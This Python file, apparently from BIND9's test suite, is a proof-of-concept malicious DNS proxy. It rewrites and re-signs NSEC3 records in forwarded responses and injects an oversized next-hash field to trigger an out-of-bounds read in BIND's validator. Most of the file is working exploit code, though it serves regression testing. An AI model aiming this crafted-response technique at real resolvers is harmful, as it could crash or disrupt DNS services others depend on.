#!/usr/bin/env python3
# Copyright (C) Internet Systems Consortium, Inc. ("ISC")
#
# SPDX-License-Identifier: MPL-2.0
#
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0.  If a copy of the MPL was not distributed with this
# file, you can obtain one at https://mozilla.org/MPL/2.0/.
#
# See the COPYRIGHT file distributed with this work for additional
# information regarding copyright ownership.

"""
Crafted authoritative DNS proxy for BIND9 NSEC3 OOB read PoC.

Simulates a malicious authoritative server that crafts NSEC3 responses
to trigger CWE-125 (out-of-bounds stack read) in validator.c:344.

Attack chain:
1. Resolver queries xxx.evil.test A -> proxy modifies NSEC3 in A response
   (breaks the NSEC3 proof, forcing proveunsecure() fallback)
2. Resolver fetches DS for xxx.evil.test -> proxy injects crafted NSEC3
   with next_length=200 (exceeds 155-byte buffer) at position 0
3. DS validation succeeds via unmodified NSEC3 (opt-out coverage)
4. ncache stores: [crafted_nsec3 (200B next), original_nsec3]
5. isdelegation() iterates ncache -> crafted first -> memcmp() OOB read

Usage: python3 crafted_auth_v6.py <ip> <port>
       Listens on [ip]:[port]
       Forwards to legitimate auth server on [10.53.0.6]:[port]

Prerequisites: pip install dnspython cryptography
"""

import base64
import glob
import os
import signal
import socket
import struct
import sys
import time

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec, utils

import dns.message
import dns.name
import dns.rcode
import dns.rdata
import dns.rdataclass
import dns.rdatatype
import dns.rrset

IP = sys.argv[1]
PORT = int(sys.argv[2])
TARGET_NEXT_LENGTH = 200
ZONE_FILE = "../ns6/evil.test.db.signed"

# NSEC3 params: alg=1(SHA1), flags=1(opt-out), iterations=10, salt=DEADBEEF
NSEC3_ALG = 1
NSEC3_FLAGS = 1
NSEC3_ITERATIONS = 10
NSEC3_SALT = bytes.fromhex("DEADBEEF")
NSEC3_TTL = 86400

# RRSIG timing: computed dynamically for portability
NOW = int(time.time())
RRSIG_LABELS = 3
RRSIG_ORIG_TTL = 86400
RRSIG_INCEPTION = NOW - 3600  # 1 hour ago
RRSIG_EXPIRATION = NOW + 30 * 86400  # 30 days from now


def discover_nsec3_from_zone(zone_file):
    """
    Auto-discover NSEC3 owner names and next hashes from the signed zone.
    Returns list of dicts sorted by owner name.
    """
    nsec3_records = []
    with open(zone_file, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith(";"):
                continue
            parts = line.split()
            if parts[3] == "NSEC3":
                print(parts)
                try:
                    idx = parts.index("NSEC3")
                    print(idx)
                    owner = parts[0]
                    next_hash_b32 = parts[idx + 5]
                    flags = int(parts[idx + 2])
                    nsec3_records.append(
                        {
                            "owner": owner,
                            "next_hash_b32": next_hash_b32,
                            "flags": flags,
                        }
                    )
                except (IndexError, ValueError):
                    continue
    nsec3_records.sort(key=lambda r: r["owner"])
    return nsec3_records


def b32_to_bytes(b32hex_str):
    """Decode base32hex (RFC 4648) to bytes."""
    padded = b32hex_str.upper() + "=" * ((8 - len(b32hex_str) % 8) % 8)
    return base64.b32hexdecode(padded)


def load_zsk():
    """Load the Zone Signing Key (ZSK) for re-signing modified records."""
    keys = glob.glob("../ns6/Kevil.test.+013+*.private")
    for kf in keys:
        pub = kf.replace(".private", ".key")
        with open(pub, "r", encoding="utf-8") as f:
            content = f.read()
        if "256 3 13" in content:
            with open(kf, "r", encoding="utf-8") as pf:
                for line in pf:
                    if line.startswith("PrivateKey:"):
                        key_bytes = base64.b64decode(line.split(":", 1)[1].strip())
                        pk = ec.derive_private_key(
                            int.from_bytes(key_bytes, "big"),
                            ec.SECP256R1(),
                            default_backend(),
                        )
                        tag = int(kf.split("+")[-1].replace(".private", ""))
                        print(f"[*] Loaded ZSK key tag={tag}", flush=True)
                        return pk, tag
    raise ValueError("No ZSK found")


def sign_rrset(
    private_key,
    key_tag,
    rrset,
    type_covered,
    labels,
    original_ttl,
    expiration,
    inception,
    signer_name,
):
    """Sign an RRset with ECDSAP256SHA256 and return RRSIG rdata."""
    algorithm = 13

    sig_rdata = struct.pack("!HBBI", type_covered, algorithm, labels, original_ttl)
    sig_rdata += struct.pack("!II", expiration, inception)
    sig_rdata += struct.pack("!H", key_tag)
    sig_rdata += signer_name.canonicalize().to_wire()

    rr_wires = []
    for rdata in rrset:
        rdata_wire = rdata.to_digestable()
        rr_wire = rrset.name.canonicalize().to_wire()
        rr_wire += struct.pack("!HHI", rrset.rdtype, rrset.rdclass, original_ttl)
        rr_wire += struct.pack("!H", len(rdata_wire))
        rr_wire += rdata_wire
        rr_wires.append(rr_wire)

    rr_wires.sort()
    sign_data = sig_rdata + b"".join(rr_wires)

    der_sig = private_key.sign(sign_data, ec.ECDSA(hashes.SHA256()))
    r, s = utils.decode_dss_signature(der_sig)
    raw_sig = r.to_bytes(32, "big") + s.to_bytes(32, "big")

    full_rrsig_wire = sig_rdata + raw_sig
    rrsig_rdata = dns.rdata.from_wire(
        dns.rdataclass.IN,
        dns.rdatatype.RRSIG,
        full_rrsig_wire,
        0,
        len(full_rrsig_wire),
        None,
    )
    return rrsig_rdata


def sign_rrset_from_template(private_key, key_tag, rrset, template_rrsig):
    """Sign using existing RRSIG as template for type_covered."""
    return sign_rrset(
        private_key,
        key_tag,
        rrset,
        template_rrsig.type_covered,
        RRSIG_LABELS,
        RRSIG_ORIG_TTL,
        RRSIG_EXPIRATION,
        RRSIG_INCEPTION,
        template_rrsig.signer,
    )


def build_crafted_nsec3(private_key, key_tag, owner_name, original_next_hash, bitmaps):
    """
    Build a crafted NSEC3 with next_length=200 (exceeds 155-byte buffer).
    Returns (nsec3_rrset, rrsig_rrset).
    """
    name = dns.name.from_text(owner_name)
    signer = dns.name.from_text("evil.test.")

    crafted_next = original_next_hash + os.urandom(
        TARGET_NEXT_LENGTH - len(original_next_hash)
    )

    nsec3_wire = struct.pack("!BBH", NSEC3_ALG, NSEC3_FLAGS, NSEC3_ITERATIONS)
    nsec3_wire += struct.pack("!B", len(NSEC3_SALT)) + NSEC3_SALT
    nsec3_wire += struct.pack("!B", TARGET_NEXT_LENGTH) + crafted_next
    nsec3_wire += bitmaps

    nsec3_rdata = dns.rdata.from_wire(
        dns.rdataclass.IN, dns.rdatatype.NSEC3, nsec3_wire, 0, len(nsec3_wire), None
    )

    nsec3_rrset = dns.rrset.RRset(name, dns.rdataclass.IN, dns.rdatatype.NSEC3)
    nsec3_rrset.update_ttl(NSEC3_TTL)
    nsec3_rrset.add(nsec3_rdata)

    rrsig_rdata = sign_rrset(
        private_key,
        key_tag,
        nsec3_rrset,
        type_covered=dns.rdatatype.NSEC3,
        labels=RRSIG_LABELS,
        original_ttl=RRSIG_ORIG_TTL,
        expiration=RRSIG_EXPIRATION,
        inception=RRSIG_INCEPTION,
        signer_name=signer,
    )

    rrsig_rrset = dns.rrset.RRset(name, dns.rdataclass.IN, dns.rdatatype.RRSIG)
    rrsig_rrset.update_ttl(NSEC3_TTL)
    rrsig_rrset.add(rrsig_rdata)

    print(
        f"[*] Built crafted NSEC3: owner={owner_name}, "
        f"next_hash={TARGET_NEXT_LENGTH}B, signed tag={key_tag}",
        flush=True,
    )
    return nsec3_rrset, rrsig_rrset


def modify_nsec3_next(rdata):
    """Modify an NSEC3 record's next_hash to TARGET_NEXT_LENGTH bytes."""
    orig_wire = rdata.to_digestable()
    pos = 0
    hash_alg = orig_wire[pos]
    pos += 1
    flags = orig_wire[pos]
    pos += 1
    iterations = struct.unpack("!H", orig_wire[pos : pos + 2])[0]
    pos += 2
    salt_len = orig_wire[pos]
    pos += 1
    salt = orig_wire[pos : pos + salt_len]
    pos += salt_len
    hash_len = orig_wire[pos]
    pos += 1
    next_hash = orig_wire[pos : pos + hash_len]
    pos += hash_len
    type_bitmaps = orig_wire[pos:]

    crafted_next = next_hash + os.urandom(TARGET_NEXT_LENGTH - len(next_hash))
    new_wire = struct.pack("!BBH", hash_alg, flags, iterations)
    new_wire += struct.pack("!B", salt_len) + salt
    new_wire += struct.pack("!B", TARGET_NEXT_LENGTH) + crafted_next
    new_wire += type_bitmaps

    return dns.rdata.from_wire(
        dns.rdataclass.IN, dns.rdatatype.NSEC3, new_wire, 0, len(new_wire), None
    )


def name_label(name):
    """Get the first label (NSEC3 hash) from a DNS name."""
    return str(name).split(".", maxsplit=1)[0].upper()


def is_target(dns_name, target_prefix):
    """Check if a DNS name's first label starts with target prefix."""
    return (
        str(dns_name)
        .split(".", maxsplit=1)[0]
        .upper()
        .startswith(target_prefix.upper())
    )


def patch_a_response(response_data, private_key, key_tag, modify_name):
    """
    Patch A response: modify the NSEC3 matching modify_name to break
    the NSEC3 proof, forcing the resolver into proveunsecure().
    """
    try:
        msg = dns.message.from_wire(response_data)
    except Exception as e:  # pylint: disable=broad-except
        print(f"[!] Parse error: {e}", flush=True)
        return response_data

    new_authority = []
    for rrset in msg.authority:
        if rrset.rdtype == dns.rdatatype.NSEC3 and is_target(rrset.name, modify_name):
            new_rrset = dns.rrset.RRset(rrset.name, rrset.rdclass, rrset.rdtype)
            new_rrset.update_ttl(rrset.ttl)
            for rdata in rrset:
                new_rrset.add(modify_nsec3_next(rdata))
            new_authority.append(new_rrset)
            print(
                f"[!] PATCHED {name_label(rrset.name)}: "
                f"next_hash -> {TARGET_NEXT_LENGTH}B",
                flush=True,
            )

        elif rrset.rdtype == dns.rdatatype.RRSIG:
            covers_nsec3 = any(rd.type_covered == dns.rdatatype.NSEC3 for rd in rrset)
            if covers_nsec3 and is_target(rrset.name, modify_name):
                target_rrset = [
                    rs
                    for rs in new_authority
                    if rs.rdtype == dns.rdatatype.NSEC3
                    and is_target(rs.name, modify_name)
                ]
                if target_rrset:
                    template = next(iter(rrset))
                    try:
                        new_rrsig = sign_rrset_from_template(
                            private_key, key_tag, target_rrset[0], template
                        )
                        rrsig_rrset = dns.rrset.RRset(
                            rrset.name, dns.rdataclass.IN, dns.rdatatype.RRSIG
                        )
                        rrsig_rrset.update_ttl(rrset.ttl)
                        rrsig_rrset.add(new_rrsig)
                        new_authority.append(rrsig_rrset)
                        print(f"[!] Re-signed " f"{name_label(rrset.name)}", flush=True)
                    except Exception as e:  # pylint: disable=broad-except
                        print(f"[!] Sign error: {e}", flush=True)
                        new_authority.append(rrset)
                else:
                    new_authority.append(rrset)
            else:
                new_authority.append(rrset)
        else:
            new_authority.append(rrset)

    msg.authority = new_authority
    try:
        wire = msg.to_wire()
        print(f"[!] A response: {len(wire)} bytes", flush=True)
        return wire
    except Exception as e:  # pylint: disable=broad-except
        print(f"[!] Wire error: {e}", flush=True)
        return response_data


def patch_ds_response(response_data, crafted_nsec3, crafted_rrsig, inject_name):
    """
    Patch DS response:
    - Change RCODE NXDOMAIN -> NOERROR
    - Inject crafted NSEC3 (200B next) at position 0 in authority
    """
    try:
        msg = dns.message.from_wire(response_data)
    except Exception as e:  # pylint: disable=broad-except
        print(f"[!] Parse error: {e}", flush=True)
        return response_data

    if msg.rcode() == dns.rcode.NXDOMAIN:
        msg.set_rcode(dns.rcode.NOERROR)
        print("[!] RCODE: NXDOMAIN -> NOERROR", flush=True)

    new_authority = [crafted_nsec3, crafted_rrsig]
    print(
        "[!] INJECTED crafted "
        f"{name_label(crafted_nsec3.name)} "
        f"(next={TARGET_NEXT_LENGTH}B) at position 0",
        flush=True,
    )

    for rrset in msg.authority:
        if is_target(rrset.name, inject_name):
            print(f"[D] Skipped original " f"{name_label(rrset.name)}", flush=True)
            continue
        new_authority.append(rrset)

    msg.authority = new_authority
    try:
        wire = msg.to_wire()
        print(f"[!] DS response: {len(wire)} bytes", flush=True)
        return wire
    except Exception as e:  # pylint: disable=broad-except
        print(f"[!] Wire error: {e}", flush=True)
        return response_data


def sigterm(*_):
    print("SIGTERM received, shutting down")
    os.remove("ans.pid")
    sys.exit(0)


def main():
    signal.signal(signal.SIGTERM, sigterm)
    signal.signal(signal.SIGINT, sigterm)
    with open("ans.pid", "w", encoding="utf-8") as pidfile:
        print(os.getpid(), file=pidfile)

    # Auto-discover NSEC3 info from signed zone
    print(f"[*] Reading zone file: {ZONE_FILE}", flush=True)
    nsec3_records = discover_nsec3_from_zone(ZONE_FILE)

    if len(nsec3_records) < 2:
        print(
            f"[!] ERROR: Need >= 2 NSEC3 records, " f"found {len(nsec3_records)}",
            flush=True,
        )
        sys.exit(1)

    # First alphabetically = inject target, second = modify target
    inject_rec = nsec3_records[0]
    modify_rec = nsec3_records[1]

    inject_name = inject_rec["owner"].split(".")[0]
    modify_name = modify_rec["owner"].split(".")[0]
    inject_owner_full = inject_rec["owner"]
    inject_next_hash = b32_to_bytes(inject_rec["next_hash_b32"])

    inject_bitmaps = bytes.fromhex("0006400000000002")  # A RRSIG

    print(f"[*] NSEC3 to INJECT (crafted): {inject_name}", flush=True)
    print(f"[*] NSEC3 to MODIFY (break proof): {modify_name}", flush=True)

    # Load ZSK for re-signing
    private_key, key_tag = load_zsk()

    # Build crafted NSEC3 with next_length=200
    crafted_nsec3, crafted_rrsig = build_crafted_nsec3(
        private_key, key_tag, inject_owner_full, inject_next_hash, inject_bitmaps
    )

    # Start UDP proxy
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((IP, PORT))
    print(f"[*] Proxy on {IP}:{PORT} -> {IP}:{PORT}", flush=True)

    while True:
        data, addr = sock.recvfrom(4096)
        try:
            query = dns.message.from_wire(data)
            qname = query.question[0].name
            qtype = query.question[0].rdtype
            qtype_text = dns.rdatatype.to_text(qtype)
            print(f"\n[<] Query from {addr}: {qname} {qtype_text}", flush=True)
        except Exception as e:  # pylint: disable=broad-except
            print(f"[<] Query parse error: {e}", flush=True)
            qtype = None

        fwd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fwd.settimeout(3)
        fwd.sendto(data, ("10.53.0.6", PORT))
        try:
            response, _ = fwd.recvfrom(65535)
            if qtype == dns.rdatatype.DS:
                print("[>] DS - inject crafted + RCODE change", flush=True)
                modified = patch_ds_response(
                    response, crafted_nsec3, crafted_rrsig, inject_name
                )
                sock.sendto(modified, addr)
            elif qtype in (dns.rdatatype.A, dns.rdatatype.AAAA):
                print(f"[>] A - modify {modify_name}", flush=True)
                modified = patch_a_response(response, private_key, key_tag, modify_name)
                sock.sendto(modified, addr)
            else:
                print(f"[>] {qtype_text} - forwarding", flush=True)
                sock.sendto(response, addr)
        except Exception as e:  # pylint: disable=broad-except
            print(f"[!] Error: {e}", flush=True)
        finally:
            fwd.close()


if __name__ == "__main__":
    main()
